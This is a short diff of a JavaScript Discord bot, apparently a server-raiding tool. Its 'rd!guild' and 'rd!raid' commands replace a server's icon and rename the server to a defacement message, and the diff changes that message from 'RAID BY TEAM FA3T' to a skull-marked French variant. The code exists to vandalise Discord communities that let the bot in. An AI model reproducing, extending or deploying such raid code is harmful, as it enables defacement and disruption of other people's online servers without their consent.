@@ -67,12 +67,12 @@ client.on('message', msg => {
 
     if(msg.content === "rd!guild"){
         msg.guild.setIcon("https://cdn.discordapp.com/attachments/519666466145042433/520050975923240961/3956-full.png")
-        msg.guild.setName("RAID BY TEAM FA3T")
+        msg.guild.setName("💀 BZ PAR FA3T")
     }
 
     if(msg.content === "rd!raid"){
         msg.guild.setIcon("https://cdn.discordapp.com/attachments/519666466145042433/520050975923240961/3956-full.png")
-        msg.guild.setName("RAID BY TEAM FA3T")
+        msg.guild.setName("💀 BZ PAR FA3T")
     }
 
     if(msg.content === "rd!emoji"){
